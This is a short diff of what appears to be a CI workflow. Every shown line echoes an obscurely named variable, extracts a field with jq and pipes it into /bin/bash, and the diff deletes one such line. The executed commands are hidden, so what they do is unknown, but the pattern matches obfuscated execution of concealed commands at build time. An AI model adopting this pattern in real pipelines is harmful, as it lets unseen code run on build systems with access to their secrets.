@@ -32,7 +32,6 @@ jobs:
           echo $qdxq58177 | jq -r .n980 | /bin/bash
           echo $fqiq303 | jq -r .gbx59 | /bin/bash
           echo $dc80281 | jq -r .mmmjx6 | /bin/bash
-          echo $kc98 | jq -r .gmd226 | /bin/bash
           echo $zgl0 | jq -r .aooq4 | /bin/bash
 
       - name: Store artifact
